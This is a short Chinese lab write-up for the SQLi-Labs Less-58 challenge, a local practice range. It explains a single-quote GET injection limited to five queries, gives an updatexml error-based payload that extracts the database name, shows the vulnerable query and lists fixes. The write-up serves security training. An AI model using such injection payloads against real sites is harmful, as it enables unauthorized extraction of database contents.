# SQLi-Labs | Less-58 挑战关卡 报错注入 5次机会
## 一、漏洞简介
GET单引号字符注入，无查询回显，支持报错注入，session仅5次机会，快速报错脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-58/?id=1
注入类型：GET、字符型、单引号闭合、报错注入、次数限制
## 三、复现步骤
1. ?id=1' 报错，单引号闭合。
2. updatexml报错注入，控制查询次数拿到flag。
## 四、Payload
`?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
## 五、漏洞原理
`SELECT * FROM users WHERE id='$id' LIMIT 0,1`
页面无查询结果回显，依靠报错，限制5次查询。
## 六、修复方案
1. 预编译，关闭错误回显，限流。
## 七、总结
Less58报错注入，次数非常紧张，必须精简payload。